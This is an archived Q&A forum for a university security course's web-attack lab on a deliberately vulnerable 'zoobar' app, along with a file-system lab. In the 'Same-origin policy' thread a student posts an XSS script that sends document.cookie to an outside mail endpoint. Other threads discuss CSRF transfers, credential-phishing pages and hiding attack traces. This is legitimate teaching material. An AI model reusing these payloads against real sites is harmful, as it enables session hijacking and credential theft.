<div><p>I would recommend not using the onsubmit handler, because then you can&#39;t distinguish between the two buttons. That said, it is strange that it&#39;s not submitting. What are you using to submit? event.submit() does not work. You have to get the form element (say, document.getElementById(...).submit()).</p></div>
<h2>Followup</h2>
<div><p>I am using a submit event handler and not on submit (i didnt have the issue when i used on submit, but I wouldn’t get the email with make check when I had that format without prevent default and resubmit). I am also using the form element to submit. But I’m not distinguishing between the two buttons or updating any parameters currently. Why is that important? Is that the issue?</p></div>
<h3>Followup Response</h3>
<div><p>I replaced everything with click handlers and forced a click instead of trying to use submit() to submit again and it fixed it. So, I presume the submit was missing some parameter identifying what input was submitted</p></div>
<h3>Followup Response</h3>
<div><p>&#43;&#43; this</p>
<p></p>
<p>onsubmit is evil, use onclick</p></div><hr><h1>exercise 11/12 email not getting sent in make check</h1>
<h3>2018-04-26T01:37:19Z</h3>
<div><p>I&#39;m really confused because when I run my file locally I receive the email, but when I run make check I&#39;m not receiving the email. Any thoughts?</p></div>
<h2>Student Answer</h2>
<div><p>I had the same problem - make sure you&#39;re not using &#96;let&#96;s instead of &#96;var&#96;s... although a perfectly acceptable javascript statement, whatever javascript engine is used to run the tests doesn&#39;t know what to do with &#96;let&#96; I guess..</p>
<p></p></div>
<h2>Staff Answer</h2>
<div><div><span style="background-color:#fff">Scope of the issue can be very large.</span></div><div><span style="background-color:#fff">One possibility I can think of is submitting the form without using preventDefault. Then the post redirect very quick causing the next request to get cancelled.</span></div><div><span style="background-color:#fff"><br /></span></div><div><span style="background-color:#fff">Sometimes you might not see this problem when you do it manually because you may use incognito mode causing no-cache to delay the POST redirect and allow your redirect to finish first.</span></div><div><span style="background-color:#fff"><br /></span></div><div>Again, the issue scope can be very broad.  If you still have question, please feel free to come to office hour. :)</div></div><hr><h1>Secfs: creating a group</h1>
<h3>2018-04-25T21:20:16Z</h3>
<div><p>Is there a way in which we can manually create a group and/or check that we can create groups properly?</p></div>
<h2>Student Answer</h2>
<div><p>Change the .groups file?</p></div><hr><h1>Lab 4, exercise 13</h1>
<h3>2018-04-25T21:10:44Z</h3>
<div><p>Just want to see if I&#39;m on the right track. It seems like the only types of files that can be loaded from another domain are images. Are we supposed to load an image to detect if a user is logged in?</p></div>
<h2>Student Answer</h2>
<div><p>Image is not the right way to go. </p></div>
<h2>Followup</h2>
<div><p>I&#39;m kind of stuck. Is there anything you&#39;d recommend looking into?</p></div>
<h2>Staff Answer</h2>
<div><p>Have try to think about hint from &#64;563?<br />There are more than images files. What are possible loaded file types you can think of or see from view page source?</p></div><hr><h1>current share?</h1>
<h3>2018-04-25T19:45:02Z</h3>
<div><p>What is current share in fs.py?</p>
<p></p>
<pre># groupmap contains a map from group ID to the list of members according to /.groups
groupmap = {}
# owner is the user principal that owns the current share
owner = None
# root_i is the i of the root of the current share
root_i = None</pre>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>Quoting this from last year: <br /><br />The SecFS server is capable of running multiple file system shares, each of which is a logical directory tree. You don&#39;t need to worry about that multiplicity because the tests only interact with one share. If multiple clients mount the same share, they should see the same directory tree. If not, they should see different directory trees.</p></div><hr><h1>Where to run secfs?</h1>
<h3>2018-04-25T19:13:59Z</h3>
<div><p>Do we run secfs on our own computers? Or do we run it on the course VM?</p></div>
<h2>Staff Answer</h2>
<div><p>Running on the course VM should be fine</p></div><hr><h1>SUNDR file identifier</h1>
<h3>2018-04-25T13:54:44Z</h3>
<div><p>&gt; Every file is identified by a &lt;principal, i-number&gt; pair, where principal is the user or group allowed to write the file, and i-number is a per principal inode number.</p>
<p></p>
<p>But if principal is user or group, how will SUNDR distinguish between a principal with UID 10 vs a group with GID 10? Do UIDs and GIDs have different namespaces? Also, if a file has both a UID and a GID, is the file identified by the UID, i-number pair or GID, i-number pair? Or do both pairs point to the same file?</p></div>
<h2>Followup</h2>
<div><p>&gt; Group i-tables add a level of indirection, mapping a group i-number onto a user i-number</p>
<p></p>
<p>Do they mean onto multiple user i-numbers? Or a single one? If it&#39;s a single one, how do they choose which user i-number (out of many) to map the group i-number onto?</p></div>
<h3>Followup Response</h3>
<div><p>&gt; A group-writable file in SUNDR is not owned by a user (as in Unix) but rather is owned by the group; such a file’s “owner” field indicates the last user who wrote to it.</p></div>
<h2>Staff Answer</h2>
<div><p>Yes, you can think of UIDs and GIDs having their own namespace. (In terms of code, take a look at secfs/types.py for an implementation example). This is similar to our usual file system, having UID=10 and GID=10 are different things. </p></div><hr><h1>SUNDR hash function</h1>
<h3>2018-04-25T13:37:26Z</h3>
<div><p>The paper says &#34;It is believed to be computationally infeasible to find any two different data blocks with the same SHA-1 hash.&#34;</p>
<p></p>
<p>However, as of last year, SHA-1 has been broken by Google, so it is no longer collision resistant. Should we use something like SHA-256 instead? Or does it not matter for the purposes of this class?</p></div>
<h2>Staff Answer</h2>
<div><p>That&#39;s a good question. I think it would probably be best to use SHA-256 instead (and this would be a simple code change in the crypto library). However, as you said, the tests will not likely catch SHA-1 vs SHA-256. </p></div><hr><h1>sudden problem running zookld?</h1>
<h3>2018-04-25T02:44:09Z</h3>
<div><p>im sshing with</p>
<pre>ssh -L localhost:8080:localhost:8080 <a href="mailto:httpd&#64;172.16.101.129">httpd&#64;172.16.101.129</a></pre>
<p>and im cd-ing to lab, and im running</p>
<pre>./zookld</pre>
<p>but im gettting: ./zookld: No such file or directory all of the sudden?</p>
<p>this was working when i did parts 1 and 2 for the lab but now suddenly it is not, and i dont believe im doing anything different.</p></div>
<h2>Staff Answer</h2>
<div>Can you run ‘make’ on the lab code?</div>
<h2>Student Answer</h2>
<div><p>make</p></div><hr><h1>Network security</h1>
<h3>2018-04-25T00:28:51Z</h3>
<div><p>A recent attack: https://doublepulsar.com/hijack-of-amazons-internet-domain-service-used-to-reroute-web-traffic-for-two-hours-unnoticed-3a6f0dda6a6f</p></div>
<h2>Followup</h2>
<div><p>Ongoing discussion on HN: <a href="https://news.ycombinator.com/item?id=16914698" target="_blank">https://news.ycombinator.com/item?id=16914698</a></p></div><hr><h1>Reference images slightly different sizes for exercise 14</h1>
<h3>2018-04-24T18:21:51Z</h3>
<div><p>My reference images for exercise 14 are slightly different sizes, but the overlapping region of them is exactly the same. Is this okay?</p>
<p></p>
<p></p>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>Is it pass make check?</p></div>
<h2>Student Answer</h2>
<div><p>See if make check PASSes. Make check checks pixel by pixel for all non-background pixels.</p></div><hr><h1>Exercise 13</h1>
<h3>2018-04-24T18:05:57Z</h3>
<div><p>For exercise 11 and 12, we are supposed to email ourselves the grader&#39;s username/password. But for exercise 13, it is only expecting the password. Is it okay if we still send username/password? </p>
<p></p></div>
<h2>Student Answer</h2>
<div><p>Nevermind, I found the answer here. &#64;542</p></div><hr><h1>Ex 13 Submitting transfers and checking login</h1>
<h3>2018-04-24T18:02:14Z</h3>
<div><p>Given what we have for answer-12.html, I&#39;m confused as to how you can check if a user is logged and and submit transfers using it as a basis for answer-13.html. How can we check if the user is logged in? And if the user is logged in, how do we submit transfers from a login page? </p>
<p></p>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>1. Use the hint about file &#34;What types of files can be loaded by your attack page from another domain?&#34;.<br />You might find understanding how each zoobar page obtains sensitive/particular information for each user useful.<br />2. For transfer submission, since you have control over the login page (you construct by yourself), you can do anything with it to allow transfer right? You can reuse and modify from part2 answer.</p></div>
<h2>Student Answer</h2>
<div><p>&#64;518</p></div><hr><h1>Thursday&#39;s office hours (4-6pm) are moved to (8-10pm) just for this week</h1>
<h3>2018-04-24T16:34:52Z</h3>
<div><p></p></div><hr><h1>Are there 9-11 office today?</h1>
<h3>2018-04-24T13:37:16Z</h3>
<div><p>There&#39;s no TA here...</p></div>
<h2>Student Answer</h2>
<div><p>i guess not then</p></div><hr><h1>Exercise 12</h1>
<h3>2018-04-23T21:14:19Z</h3>
<div><p>Hey does anyone have hints on how to resubmit the form in setTimeout()?  I tried calling</p>
<p>document.forms[&#34;zoobarform&#34;].submit() in the function call inside setTimeout(), but it doesn&#39;t actually submit.  I suspect it&#39;s b/c I can&#39;t determine which submit was originally called (login or register), but I&#39;m also not sure how to recover that info?</p></div>
<h2>Student Answer</h2>
<div><p>The answer is... you can&#39;t. Don&#39;t use onsubmit handlers.</p>
<p></p>
<p>https://stackoverflow.com/questions/3577469/form-onsubmit-determine-which-submit-button-was-pressed</p></div><hr><h1>Spectre paper question: mix_i</h1>
<h3>2018-04-23T16:54:12Z</h3>
<div><p>Now that the paper question was submitted, I was wondering if I could get an explanation for the expected value of mix_i on a cache hit. I didn&#39;t understand what to expect the value to be, so I ran the code and logged the mix_i values, finding the most frequent ones to report a cache hit. I got that the values 0-6 appeared often, but I have no idea why...</p></div><hr><h1>challenge times out</h1>
<h3>2018-04-23T14:41:47Z</h3>
<div><p>What does it mean for the challenge to time out? It worked fine when I tested it manually, but times out in the grade (make check).</p></div>
<h2>Staff Answer</h2>
<div><p>Can you specify which is the last check that passes before the timeout? If this persists it might be helpful to check with a TA during office hours.</p></div>
<h2>Followup</h2>
<div><p></p><pre>[ INFO ]: Testing exploit for Challenge...
Registering as grader, MBOSMWEUINTM
Registering as attacker, attackerpassword
Loading attacker page
[ FAIL ]: the grading script timed out</pre>
<p></p></div>
<h2>Followup</h2>
<div><p>how long is the timeout btw? it does take a second for the reload to happen for some reason</p>
<p>is that too long?</p></div>
<h2>Followup</h2>
<div><p>You might be running into this bug in phantomJS, where onLoadFinished is never called for certain pages (including one way of solving this challenge, which I initially tried):</p>
<p><a href="https://github.com/ariya/phantomjs/issues/10265">https://github.com/ariya/phantomjs/issues/10265</a>.</p>
<p>You might have to work around it</p></div><hr><h1>why would myspace use eval()</h1>
<h3>2018-04-23T00:36:05Z</h3>
<div><p></p><pre>if (Name != &#34;&#34; &amp;&amp; Value != &#34;&#34;) eval(&#34;this.NodeArray[&#34; &#43; NodeIndex &#43; &#34;].&#34; &#43; Name &#43; &#34;=\&#34;&#34; &#43; Value &#43; &#34;\&#34;;&#34;);</pre>
<p>this seems like it can easily be done without eval()</p>
<p>why would myspace use eval() for something like this?</p>
<p></p>
<p>is this just bad code?</p></div>
<h2>Staff Answer</h2>
<div><p>Indeed it&#39;s a bad practice. Google has a nice way to prevent this, check this conversation:</p>
<p></p>
<p>https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses</p></div><hr><h1>jquery</h1>
<h3>2018-04-23T00:26:59Z</h3>
<div><p>are we allowed to use jquery (by script src=&#34;some cdn link&#34;) in ex 14 (or any of the lab 4 exercises)?</p>
<p></p>
<p>when doing dom manipulation, jquery makes things a lot easier/less verbose</p></div>
<h2>Followup</h2>
<div><p>on a related note, can any internet resources be used? or is are the exercises supposed to work offline (using only localhost:// addresses)?</p></div>
<h3>Followup Response</h3>
<div><p>See above comment about payloads being stand-alone.</p></div>
<h2>Staff Answer</h2>
<div><p>No, because it&#39;s easy for the server to disable external scripts as a mitigation. You got to be able to write stand-alone code with no dependencies, that is indeed the way of the hacker</p></div><hr><h1>ex 14</h1>
<h3>2018-04-22T23:15:08Z</h3>
<div><p>only the users page /users need to have zoobars display as 10, and no log entries, right?</p>
<p></p>
<p>so it should be fine if / and /transfer display less than 10 zoobars?</p>
<p></p>
<p>just wanted to make sure (that we only needed to hide our tracks on the users page</p></div>
<h2>Followup</h2>
<div><p>Furthermore, for the users page, do we want the zoobars to always be 10, regardless of if the user transferred zoobars to other people (not the attacker)? Do we want to clear all log entries, even log entries where the user sends zoobars to other people?</p>
<p></p>
<p>Do we just assume that zoobars are only being transferred to the attacker, so that we can set zoobar = 10, and log entries = &lt;empty&gt;?</p></div>
<h3>Followup Response</h3>
<div><p>It will be hard to tell a legit transfer from a CSRF&#39;d transfer, so cleaning everything should be good enough.</p></div>
<h3>Followup Response</h3>
<div><p>Since we&#39;re clearing the entries, the entries might flash up for a split second before disappearing. That&#39;s fine right? I&#39;m not sure how to make the entries not appear at all (vs. clearing them like I&#39;m doing now).</p></div>
<h3>Followup Response</h3>
<div><p>if it flashes, youre not listening for quite the right event</p></div>
<h3>Followup Response</h3>
<div><p>onload?</p></div>
<h3>Followup Response</h3>
<div><p>the only available event is window.onload (document.onload doesn&#39;t work)</p>
<p></p>
<p>and you have to wait for the DOM element to load before you can even reference it</p></div>
<h2>Staff Answer</h2>
<div><p>Correct.</p></div><hr><h1>make check only part b</h1>
<h3>2018-04-22T19:47:49Z</h3>
<div><p>Is there any way to only do exercise 9 onwards for the test?</p></div>
<h2>Student Answer</h2>
<div><p>you can temporarily move answer 1-8 into another folder. </p></div><hr><h1>Exercise 13 not receiving email with make check</h1>
<h3>2018-04-21T19:50:38Z</h3>
<div><p>I have run this test a few times now, but I don&#39;t seem to receive the email when running make check. However, when I test it locally by opening answer-13.html when logged in vs when not, I do get the emails with the user&#39;s password when the user isn&#39;t logged in and tries to log in.</p></div>
<h2>Staff Answer</h2>
<div>If your attack work properly, you will receive both. You will need to find the issue with your exploit. Did your exercise that you copy from in part 2 work properly? </div>
<h2>Followup</h2>
<div><p>Yes, it passed that part of the test. I just didn&#39;t get an email.</p></div>
<h3>Followup Response</h3>
<div><p>Did you get the email for ex 11? Even if the test passes, you still have to check you received the email with the correct string.</p></div><hr><h1>Exercise 11 and 12</h1>
<h3>2018-04-21T17:37:12Z</h3>
<div><p>The first version of exercise 11 that I wrote seems to automatically log the user in and register them correctly too. So, if I copy it over to answer-12.html and run make check, it passes the test for 12 with no changes. I hope I don&#39;t have to go back and remove something from 11 to make it not the same as 12.</p></div>
<h2>Student Answer</h2>
<div><p>&#64;485</p></div><hr><h1>Lab4 handout part 3 has been updated</h1>
<h3>2018-04-21T15:55:45Z</h3>
<div><p>Lab4 handout part 3 has been updated to follow check script format. <br /><br />Changes Summary: email formats for these following exercises<br /><br />Ex11 and Ex12: <br />username/password<br /><br />Ex.13 and Challenge:<br />password<br /><br /></p></div><hr><h1>.git/ folder corrupted</h1>
<h3>2018-04-21T01:34:29Z</h3>
<div><p>I committed and submitted lab 3a just fine, but when I started lab 3b I <tt>ssh</tt>&#39;ed in to the VM, <tt>cd</tt>&#39;ed into <tt>lab/</tt>, ran <tt>git status</tt> and got:</p>
<p></p>
<pre>httpd&#64;vm-6858:~/lab$ git status<br />error: object file .git/objects/78/9aed39ba98269293ba7114256ff2b6af0d7610 is empty<br />error: object file .git/objects/78/9aed39ba98269293ba7114256ff2b6af0d7610 is empty<br />fatal: loose object 789aed39ba98269293ba7114256ff2b6af0d7610 (stored in .git/objects/78/9aed39ba98269293ba7114256ff2b6af0d7610) is corrupt</pre>
<p>I can&#39;t run any git commands in this state. I recovered from this by re-cloning the repo from lab 1 and iteratively downloading each of my lab submission zip files, re-adding their changes, and committing them before starting lab 3b. However, now I&#39;ve just run into the same error starting lab 4 and I don&#39;t want to have to go through that process again. How can I fix this? All I&#39;ve seen online is that you need a new .git/ folder, which I don&#39;t think is included in the submitted zip files, so I&#39;m not sure what to do... For now I&#39;ll just re-clone from lab 1 and checkout the lab4 branch from there, but I&#39;d like to have my git history back.</p></div>
<h2>Followup</h2>
<div>Update: I was able to finish lab4 with the strategy mentioned above, but would still like to solve this for future parts.</div>
<h2>Staff Answer</h2>
<div><p>You can try this: https://mirrors.edge.kernel.org/pub/software/scm/git/docs/user-manual.html#recovering-from-repository-corruption</p></div><hr><h1>Exercise 11 Expected String</h1>
<h3>2018-04-21T01:28:09Z</h3>
<div><p>Make check says &#34;Check email, expecting string &#39;grader/AKWCXADTIVBT&#39;&#34;</p>
<p></p>
<p>Are we supposed to email both user name and password in the format of [username]/[password]? Or are we only supposed to email the password? If so, shouldn&#39;t the expected string be just the password?</p>
<p></p></div>
<h2>Student Answer</h2>
<div>see &#64;507</div>
<h2>Staff Answer</h2>
<div><p>handout is fixed! &#64;542  (same as &#64;507)<br /><br /></p></div><hr><h1>Lab 4 Ex 11 Button onClick</h1>
<h3>2018-04-20T20:59:23Z</h3>
<div><p>The grading script correctly finds and clicks on my Log in button for this exercise (note I have a type=&#34;button&#34; and not a type=&#34;submit&#34;), but the onclick function isn&#39;t found; I get this error:</p>
<p></p>
<pre>ReferenceError: Can&#39;t find variable: onSubmit</pre>
<p>(onSubmit is the name of the function, defined in a &lt;script&gt; block in the header)</p>
<p></p>
<p>When I open answer-11.html in Firefox, the page works fine. Clicking the button sends me an email with the username and password, and there are no errors in the console. What&#39;s different in the grading script that could make this fail?</p></div>
<h2>Staff Answer</h2>
<div><p>Seem like the error is with your onSubmit and onclick. Try to check from that.</p></div>
<h2>Followup</h2>
<div><p>That much I understand, but do you have any idea why it would work fine in Firefox on my computer but not in the grading script?</p></div><hr><h1>Same-origin policy</h1>
<h3>2018-04-20T19:34:25Z</h3>
<div><p>I know the same-origin policy prevents scripts inside a web page from <strong>accessing</strong> data in a second web page with different origin, but does the same-origin policy prevent scripts inside a web page from <strong>sending</strong> HTTP requests to web servers with different origins?</p></div>
<h2>Staff Answer</h2>
<div><p>It does unless the CORS (cross origin resource sharing) header is allowed: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</p></div>
<h2>Followup</h2>
<div><p>Hmmm, I&#39;m a bit confused then. In exercise 4 (lab 4), I crafted a URL that added the following HTTP to the users page (and passed the test):</p>
<pre>&lt;script&gt;
  var cookieValue=encodeURIComponent(document.cookie);
  var xmlHttp=new XMLHttpRequest();
  xmlHttp.onreadystatechange=function(){
    if(xmlHttp.readyState==4&amp;&amp;xmlHttp.status==200)
      callback(xmlHttp.responseText);
  };
  xmlHttp.open(&#34;GET&#34;,&#34;http://css.csail.mit.edu/6.858/2018/labs/sendmail.php?to=jatron&#64;mit.edu&amp;payload=&#34;&#43;cookieValue&#43;&#34;&amp;send_submit=Send&#43;Email&#34;,true);
  xmlHttp.send(null);
&lt;/script&gt;</pre>
<p>It sends a GET request to the endpoint &#34;http://css.csail.mit.edu/6.858/2018/labs/sendmail.php&#34;</p>
<p></p>
<p>If the same-origin policy prevent scripts inside a web page from <strong>sending</strong> HTTP requests to web servers with different origins, how did my URL for exercise 4 work? I thought the browser wouldn&#39;t allow me to send the GET request.</p></div>
<h3>Followup Response</h3>
<div><p>Sorry, I misunderstood your question. You are allowed to <strong>send</strong> whatever request you want, but there&#39;s not guarantee the server will return a response if you&#39;re not in the same origin. </p></div>
<h3>Followup Response</h3>
<div><p>Thanks!</p></div><hr><h1>Does doing more than 1 of the &#34;ideas for improvements&#34; give more extra credit?</h1>
<h3>2018-04-20T18:33:55Z</h3>
<div><p></p></div>
<h2>Staff Answer</h2>
<div>What is that exercise? Is it a challenge? </div>
<h2>Student Answer</h2>
<div><p>https://css.csail.mit.edu/6.858/2018/labs/lab5.html#ideas-for-improvements</p></div><hr><h1>DO NOT use private browsing for testing zoobar</h1>
<h3>2018-04-20T17:41:33Z</h3>
<div><p>Private browsing slows down the browser a lot (because it disables the cache), and hides race conditions. So if you use private browsing, you might have race conditions in your code (that cause it to fail in the grader), but yet deterministically work every time on your browser because of private browsing.</p>
<p></p>
<p>Credits to Cattalyya for discovering this bug.</p></div><hr><h1>Exercise 8 using multiple files</h1>
<h3>2018-04-20T17:41:10Z</h3>
<div><p>Can we use 2 files to make the iframe and form happen? Like have the main code be in answers-8.txt but reference another file like answers-8-src.txt?</p>
<p></p>
<p>This way rendering the form inside the iframe is easier</p></div>
<h2>Student Answer</h2>
<div><p>You can use a div to encapsulate your form and then set the div to display:none, and still target the iframe using the form in your div, and nothing will ever show up.</p></div><hr><h1>Exercise 8</h1>
<h3>2018-04-20T17:12:58Z</h3>
<div><p>I&#39;m kind of stuck on this exercise. In particular, I&#39;m not sure how &lt;iframe&gt; tags can be used to redirect the browser to <a href="http://css.csail.mit.edu/6.858/2018/">http://css.csail.mit.edu/6.858/2018/</a>. I&#39;m thinking about putting the form inside an iframe. Am I on the right track or is there a better way to do it?</p></div>
<h2>Student Answer</h2>
<div><p>iframes themselves just hold stuff/load, I guess.  javascript is what has the power to do stuff like redirects.</p>
<p></p>
<p>iframes are great for a lot of sneaky stuff though, particularly in loading things that you want to hide from users, but that you need to put somewhere or need information from.</p></div><hr><h1>Can&#39;t run the server on localhost</h1>
<h3>2018-04-20T17:07:38Z</h3>
<div><p>After I run:</p>
<pre>ssh -L localhost:8080:localhost:8080 httpd&#64;VM-IP-ADDRESS</pre>
<p>with my VM&#39;s IP address on mac, it creates a process that listens to the port 8080. I know this by running:</p>
<pre>lsof -ti:8080</pre>
<p>that outputs the new process.</p>
<p></p>
<p>Then, when I try to run ./zookld,  I get error:</p>
<pre>zookld: bind: Address already in use</pre>
<p></p>
<p>However, if I kill that process, the binding from localhost to the VM&#39;s IP is gone and I can run ./zookld server but it is on the VM&#39;s IP address.</p>
<p></p>
<p>Help will be appreciated!</p></div>
<h2>Student Answer</h2>
<div><p>I run the following instead. Worth a try for you maybe?</p>
<pre>ssh -L 8080:localhost:8080 httpd&#64;VM-IP-ADDRESS</pre>
<p></p></div>
<h2>Followup</h2>
<div><p>Unfortunately, the error remains to be the same.</p></div><hr><h1>Exercise 5 clarification</h1>
<h3>2018-04-20T16:59:25Z</h3>
<div><p>So do we get a pass if our images look similar even if the automatic grading says that there is a pixel mismatch?</p></div>
<h2>Staff Answer</h2>
<div><p>No. You will need to fix to match every pixel to pass the test.</p></div><hr><h1>Exercise 8 Location Bar</h1>
<h3>2018-04-20T14:23:59Z</h3>
<div><p>I&#39;m still confused about the location bar for exercise 8:</p>
<p></p>
<p>in the form we used to have &lt;form method=&#34;POST&#34; name=&#34;transferform&#34; action=&#34;http://localhost:8080/zoobar/index.cgi/transfer&#34;&gt;</p>
<p></p>
<p>so does this mean we want action = &#34;file:/// Something else here&#34;? But the form posts to action, so are we supposed to do something clever like getting &#34;baseURI&#34; and setting innerHTML?</p></div>
<h2>Staff Answer</h2>
<div><p>No. You still need POST request to the actual zoobar site (action=&#34;....localhost:8080)<br />Remember a hint on using iframe.<br /> Try to think about how can you relate iframe to a form POST request in order to avoid redirect the main page to the zoobar site :). Otherwise the user can see the url on location tab.<br /><br />Related discussion on why you hide zoobar url from user: &#64;502</p></div><hr><h1>make check not working?</h1>
<h3>2018-04-20T07:10:53Z</h3>
<div><p>this is the error im getting:</p>
<p><br />httpd&#64;vm-6858:~/lab$ make check ./check-lab4.sh</p>
<p>Generating reference images...</p>
<p>./check-lab4.sh: line 12: /tmp/zookld.out: Permission denied</p>
<p>failed to connect to localhost:8080</p>
<p>Makefile:15: recipe for target &#39;check&#39; failed</p>
<p>make: *** [check] Error 1</p>
<p></p></div>
<h2>Student Answer</h2>
<div><p>oops nvm this has already been asked</p></div><hr><h1>Exercise 8 - form is hidden but shows up right before redirecting</h1>
<h3>2018-04-20T05:06:13Z</h3>
<div><p>My form has &#34;display: none&#34;, so it starts off hidden but right after submitting and right before redirecting, I see a glimpse of the form...</p>
<p></p>
<p>I&#39;ve tried all sorts of CSS, JS tricks but to no avail. Maybe I&#39;m missing something? Or is this phenomenon okay?</p></div>
<h2>Followup</h2>
<div><p>hmm you can see the redirect? maybe your web browser is too slow?</p>
<p></p>
<p>i can only see the 858 page because the redirect happens so fast I don&#39;t see the previous page at all</p></div>
<h2>Student Answer</h2>
<div><p>Is it <em>your </em>form that you&#39;re seeing a glimpse of? Or is it the response from the zoobar website, sent back when you post your form? If it&#39;s the latter, think some more about the hints in the exercise.</p></div>
<h2>Followup</h2>
<div><p>It&#39;s my form, not the response from the zoobar website. </p></div><hr><h1>Understanding test output for Exercise 2</h1>
<h3>2018-04-20T03:57:01Z</h3>
<div><p>For Exercise 2, running &#34;make check&#34; I get the error:</p>
<pre>[ INFO ]: Testing exploit for Exercise 2...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check email, expecting string &#39;grader#8c1d599eee045a70174e211ed1bbb186&#39;</pre>
<p>However when I check my email I get the message:</p>
<pre>Payload:

PyZoobarLogin=grader#8c1d599eee045a70174e211ed1bbb186</pre>
<p>What is the bug I should fix? I&#39;m confused since the email looks right to me. </p></div>
<h2>Staff Answer</h2>
<div><p>[????] is not an error but indicate that the status is undefined<br />You can verify PASS and FAIL by follow the instruction. Checking an email for the expected string in this case. <br />So you are good to go in this case.</p></div><hr><h1>Can&#39;t run make check</h1>
<h3>2018-04-20T01:09:07Z</h3>
<div><p>I am unable to run make check. When I try, I get this:</p>
<p></p>
<p><tt>httpd&#64;vm-6858:~/lab$ make check</tt></p>
<p><tt>./check-lab4.sh</tt></p>
<p><tt>Generating reference images...</tt></p>
<p><tt>./check-lab4.sh: line 12: /tmp/zookld.out: Permission denied</tt></p>
<p><tt>failed to connect to localhost:8080</tt></p>
<p><tt>Makefile:15: recipe for target &#39;check&#39; failed</tt></p>
<p><tt>make: *** [check] Error 1</tt></p>
<p></p>
<p>Why would it be unable to connect to localhost:8080? I thought I followed the steps at the beginning of the lab to set up the forwarding and stuff.</p></div>
<h2>Student Answer</h2>
<div>Maybe try sudo make check? I&#39;ve always to run sudo with it for some weird reason.</div>
<h2>Followup</h2>
<div><p>Oh good call, I had to use sudo but now it runs the checks. Thanks!</p></div><hr><h1>Can&#39;t send email from URL</h1>
<h3>2018-04-20T01:02:51Z</h3>
<div><p>I&#39;ve done Exercise 2 and Exercise 3 successfully, but when I try to combine them to build a URL that sends an email, I can&#39;t. I&#39;m even trying just sending an email with &#39;TEST&#39; instead of the actual cookie, but an email is never being sent, even though I think my URL is right. In my VM terminal where I&#39;m running <tt>./zookld</tt>, whenever I try to go to the URL that should send the email, I get this: </p>
<pre>zookd: [1323] Request failed: http_request_line: Socket IO error</pre>
<p>I&#39;m not even sure that this request failed message is related, but I have no idea why I am unable to send any email. Anyone have ideas about what could be going on?</p></div>
<h2>Followup</h2>
<div><p>Resolved: The problem I was having with the URL had to do with my encoding of the URL. Was able to fix it by using the suggested encoding website.</p></div>
<h2>Student Answer</h2>
<div><p>resolved below</p></div><hr><h1>Whose email do we send it to?</h1>
<h3>2018-04-19T23:44:39Z</h3>
<div><p>For Lab 4 Exercise 2, do we send it to our own mit email? Is that what we should put in our answer-2.js file?</p></div>
<h2>Staff Answer</h2>
<div>Exactly!</div><hr><h1>Exercise 13. How to detect if a user is logged in?</h1>
<h3>2018-04-19T21:05:00Z</h3>
<div><p>How do we detect if a user is logged in?</p></div>
<h2>Student Answer</h2>
<div><p>With a side channel. </p></div>
<h2>Followup</h2>
<div><p>Explain more? plz</p></div>
<h3>Followup Response</h3>
<div><p>&#34;Is a user logged in?&#34; = special case of &#34;Which user is logged in?&#34;</p></div>
<h3>Followup Response</h3>
<div><p>Hmm I&#39;m confused. I&#39;m trying to access values in the html form using various properties of document, but they all seem to be overwritten when I re-load the page to my exploit (aka the .../answer-13.html) file. I tried using document.cookie, but that&#39;s also overwritten. None of the information is preserved when my new exploit page is loaded, so I don&#39;t understand how to retrieve the old information.</p></div>
<h3>Followup Response</h3>
<div><p>Figured it out. You need to load one of the scripts that the transfers page would have loaded and see if local variables exist.</p></div>
<h3>Followup Response</h3>
<div><p>I&#39;m not sure what you mean by loading one of the scripts that the transfers page would have loaded. Could you expand? In particular, I&#39;m not sure how loading would work. Wouldn&#39;t the same-origin policy prohibit it?</p></div>
<h2>Followup</h2>
<div><p>do we try to load the html of a zoobar page? how do you load the html of another page into your page and examine its contents? any hints would be appreciated</p></div>
<h3>Followup Response</h3>
<div><p>you don&#39;t</p></div>
<h3>Followup Response</h3>
<div><p>prohibited by same origin policy</p></div>
<h2>Followup</h2>
<div><p>Just want to see if I&#39;m on the right track. It seems like the only types of files that can be loaded from another domain are images. Are we supposed to load an image to detect if a user is logged in?</p></div>
<h3>Followup Response</h3>
<div><p>&#64;573</p></div><hr><h1>Exercise 2 test times out too quickly</h1>
<h3>2018-04-19T06:33:20Z</h3>
<div><p>I was trying to figure out why my solution for exercise 2 would work in the browser, but not in make check (I would never receive an email). After trying many different solutions, I tried increasing the timeout for the test from 2000ms to 10000ms in grade-ex02.js:48. This resulted in me getting an email every time. Do I need to make my solution run faster or is it okay if the send email request needs more time to complete?</p></div>
<h2>Followup</h2>
<div><p>How are you sending out the email? It only takes a ~7 ms for me, and it&#39;s never too slow.</p></div>
<h3>Followup Response</h3>
<div><p>I am using the provided sendmail script. I know that this works because I do get the email if I increase the timeout. Sometimes when I use the test on http://css.csail.mit.edu/6.858/2018/labs/sendmail.php it takes several seconds to complete (maybe it just depends on the number of people trying to use it at once?)</p></div>
<h3>Followup Response</h3>
<div><p>really? are you using</p>
<pre>(new Image()).src=&#39;http://css.csail.mit.edu/6.858/2018/labs/sendmail.php?&#39; &#43; &#39;to=your-mit-username&#64;mit.edu&#39; &#43; &#39;&amp;payload=some-string&#39; &#43; &#39;&amp;random=&#39; &#43; Math.random();</pre>
<p>?</p>
<p>i&#39;m surprised there&#39;s a 1000x difference in speed for us.</p></div>
<h3>Followup Response</h3>
<div><p>Yes I am doing exactly that. I have even tried hardcoding all of the parameters. Trying that string in a browser (sends an email) and then trying it in make check (no email) and then trying it with make check with an increased timeout (sends an email). I also waited for each email to be received before starting the next test. It is definitely very strange. If I am the only person with the issue though maybe something else is going on.</p></div>
<h2>Followup</h2>
<div><p>For make check, one of the emails arrives immediately, the other 2 arrive 5 minutes later. I don&#39;t know why that happens, but it does. Wait for 5-6 minutes, then check you inbox again. Maybe it&#39;s some rate limiting thing to prevent abuse?</p></div>
<h3>Followup Response</h3>
<div><p>I have waited for several hours without any email...</p></div>
<h3>Followup Response</h3>
<div><p>Did you remember to change &#34;your-mit-username&#64;mit.edu&#34; to your email? </p></div>
<h2>Student Answer</h2>
<div><p>Nevermind it is working now. Not sure if something was changed with the emailscript (or maybe I had a slow connection?), but make check is working for me now with the 2 second timeout.</p></div><hr><h1>Exercise 11</h1>
<h3>2018-04-19T02:52:45Z</h3>
